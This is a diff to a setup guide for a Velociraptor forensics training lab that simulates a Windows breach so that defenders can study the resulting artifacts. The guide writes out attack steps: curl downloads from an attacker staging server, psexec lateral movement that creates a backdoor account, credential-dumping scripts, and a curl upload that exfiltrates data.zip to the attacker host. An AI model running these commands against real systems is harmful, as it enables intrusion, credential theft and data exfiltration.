@@ -3,16 +3,16 @@
 I like to use `xfreerdp` to access the machine because it is easy to script it.
 
 Main victim machine:
-Assume IP is 172.31.14.220 $attacker_machine_ip
-Assume Public IP is $public_ip_of_victim
+Assume IP is 172.31.14.220 `$attacker_machine_ip`
+Assume Public IP is `$public_ip_of_victim`
 
 ```
 xfreerdp /u:administrator /v:$public_ip_of_victim /p:'password_of_vm' -decorations /dynamic-resolution -compression -themes /f  /audio-mode:1  /t:MainVictim
 ```
 
 Attacker Machine
-Assume IP is 172.31.7.131 $attacker_machine_ip
-Assume Public IP is $public_ip_of_attacker
+Assume IP is 172.31.7.131 `$attacker_machine_ip`
+Assume Public IP is `$public_ip_of_attacker`
 
 ```
 xfreerdp /u:administrator /v:$public_ip_of_attacker /p:'password_of_vm' -decorations /dynamic-resolution -compression -themes /f  /audio-mode:1  /t:MainVictim
@@ -95,7 +95,7 @@ cd stage
 
 1. Install server as per instructions.
 
- Assume hostname is ctf.velocidex-training.com
+ Assume hostname is `ctf.velocidex-training.com`
 
 2. Create new org
 3. build an MSI for it.
@@ -103,17 +103,17 @@ cd stage
    artifact and adding the MSI manually. This will produce a public
    serve URL which you can share.
 
-on all Windows machines install Velociraptor (XXXX is from the public share URL)
+on all Windows machines install Velociraptor (`XXXX` is from the public share URL)
 ```
 curl.exe https://ctf.velocidex-training.com/public/XXXX -o velo.msi
 msiexec /i velo.msi
 ```
 
 5. Add the following client monitoring
- - ETW.FileCreation
- - TrackProcesses with sysmon.
+ - `ETW.FileCreation`
+ - `TrackProcesses` with sysmon.
 
-# Prepare windows machine - MainVictim
+# Prepare windows machine - Main Victim
 
 This is the Windows Machine which will be breached.
 
@@ -138,16 +138,16 @@ Set-NetFirewallRule -DisplayGroup "File And Printer Sharing" -Enabled True -Prof
 
 ```
 
-# Prepare windows machine - AttackVictim
+# Prepare windows machine - Attack Victim
 
 This VM is also a windows machine which will serve as patient 0. This
-is the intial attack vector used by the attacker to laterally move to
-the MainVictim.
+is the initial attack vector used by the attacker to laterally move to
+the Main Victim.
 
 For this demonstration we assume the attacker has local admin on
-AttackVictim usually via Phishing or other vector. We also assume the
-attacker has creds on the MainVictim machine so they can laterally
-move to it (e.g. via dumping creds from memory or bruteforcing).
+Attack Victim usually via Phishing or other vector. We also assume the
+attacker has credentials on the Main Victim machine so they can laterally
+move to it (e.g. via dumping credentials from memory or brute forcing).
 
 ```
 # Enable Prefetch
@@ -166,10 +166,10 @@ curl.exe http://172.31.7.131:1314/rdp.cmd -o c:\Users\Administrator\Desktop\rdp.
 c:\Users\Administrator\Desktop\psexec64.exe \\172.31.14.220 -u administrator -r notsuspicious -s -c c:\Users\Administrator\Desktop\rdp.cmd  -accepteula
 ```
 
-## Log in with the new user creds and RDP
+## Log in with the new user credentials and RDP
 
-The new account is created with the creds in rdp.cmd
-winsupport/P@ssword . It is probably a good idea to change the
+The new account is created with the credentials in `rdp.cmd`
+`winsupport/P@ssword` . It is probably a good idea to change the
 password but do not use special chars like $ or quotes because they
 make it harder to quote in powershell.
 
@@ -179,19 +179,19 @@ make it harder to quote in powershell.
 xfreerdp /u:winsupport /v:$public_ip_of_victim /p:'P@ssword' -decorations /dynamic-resolution -compression -themes /f  /audio-mode:1 /t:WinSupport
 ```
 
-Start a web broser and navigate to google: Search for "How to hack!"
+Start a web browser and navigate to google: Search for "How to hack!"
 
 Navigate to the staging server: http://172.31.7.131:1314/
 
-Download pd.exe and dump_creds.ps1
+Download pd.exe and `dump_creds.ps1`
 
-Open explorer and navigate to c:\users\administrator\desktop
+Open explorer and navigate to `c:\users\administrator\desktop`
 
 Open some documents (for recent files etc)
 
-## Capturing creds
+## Capturing credentials
 
-* Open an ISE as administrator
+* Open an `ISE` as administrator
 * Start a new file . Paste the following into it
 
 ```
@@ -210,7 +210,8 @@ dir C:\Users\Public
 curl.exe -F 'file=@C:\Users\Public\data.zip' http://172.31.7.131:1314/upload
 ```
 
-NOTE: leave ISE open or hard close so the autosave stays availible as a forensic artifact.
+NOTE: leave `ISE` open or hard close so the auto-save stays available as
+a forensic artifact.
 
 
 ## Install persistence
